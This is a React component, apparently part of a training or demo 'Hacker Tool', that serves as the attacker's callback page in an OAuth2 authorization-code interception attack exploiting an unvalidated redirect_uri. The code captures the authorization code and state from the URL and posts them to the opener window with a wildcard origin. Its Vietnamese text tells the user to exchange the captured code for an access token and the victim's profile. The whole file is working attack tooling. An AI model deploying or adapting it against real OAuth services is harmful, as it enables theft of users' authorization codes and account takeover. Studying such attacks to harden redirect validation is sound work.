import { useEffect, useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'

export default function CallbackPage() {
  const loc = useLocation()
  const nav = useNavigate()
  const [params, setParams] = useState({ code: '', state: '' })
  const [copied, setCopied] = useState(false)

  useEffect(() => {
    const searchParams = new URLSearchParams(loc.search)
    const code = searchParams.get('code') || ''
    const state = searchParams.get('state') || ''
    setParams({ code, state })

    // Gửi message cho parent window nếu đây là popup window
    if (window.opener) {
      window.opener.postMessage({ type: 'OAUTH_CODE_INTERCEPTED', code, state }, '*')
    }
  }, [loc])

  const copyToClipboard = () => {
    navigator.clipboard.writeText(JSON.stringify(params, null, 2))
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#0f172a',
      color: '#e2e8f0',
      fontFamily: 'monospace',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div className="card" style={{ maxWidth: '600px', width: '100%', border: '1px solid #dc2626', boxShadow: '0 0 15px rgba(220, 38, 38, 0.3)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', borderBottom: '1px solid #dc2626', paddingBottom: '10px', marginBottom: '20px' }}>
          <div>
            <h1 style={{ fontSize: '20px', margin: 0, color: '#ef4444', fontWeight: 800 }}>
              AUTH CODE INTERCEPTED!
            </h1>
            <p style={{ margin: 0, fontSize: '11px', color: '#94a3b8' }}>
              OAuth2 Authorization Code Interception (Attacker Callback Endpoint)
            </p>
          </div>
        </div>

        <p style={{ fontSize: '13px', color: '#cbd5e1', lineHeight: '1.6', marginBottom: '16px' }}>
          Hệ thống OAuth2 Server đã chuyển hướng User (với authorization code nhạy cảm) về URL của Hacker vì <strong style={{ color: '#f59e0b' }}>redirect_uri không được validate whitelist</strong>.
        </p>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: '1px solid #334155' }}>
            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>Captured Code:</span>
            <div style={{ color: '#22c55e', fontSize: '16px', fontWeight: 'bold', marginTop: '6px', wordBreak: 'break-all' }}>
              {params.code || '(null / empty)'}
            </div>
          </div>

          <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: '1px solid #334155' }}>
            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>State:</span>
            <div style={{ color: '#f59e0b', fontSize: '14px', marginTop: '6px', wordBreak: 'break-all' }}>
              {params.state || '(null / empty)'}
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '10px', marginTop: '24px' }}>
          <button className="btn btn-danger" onClick={copyToClipboard} style={{ flex: 1 }}>
            {copied ? 'Copied' : 'Copy JSON data'}
          </button>
          
          {window.opener ? (
            <button className="btn btn-ghost" onClick={() => window.close()} style={{ flex: 1, border: '1px solid #475569' }}>
              Close Window
            </button>
          ) : (
            <button className="btn btn-ghost" onClick={() => nav('/oauth2')} style={{ flex: 1, border: '1px solid #475569' }}>
              Return to Hacker Tool
            </button>
          )}
        </div>

        <div style={{ marginTop: '20px', padding: '12px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '6px', fontSize: '12px', color: '#f87171' }}>
          <strong>Lưu ý:</strong> Dữ liệu code này đã được gửi về giao diện điều khiển chính của Hacker Tool. Bạn có thể quay lại tab cũ để tiến hành đổi code lấy Access Token và truy xuất User Profile.
        </div>
      </div>
    </div>
  )
}
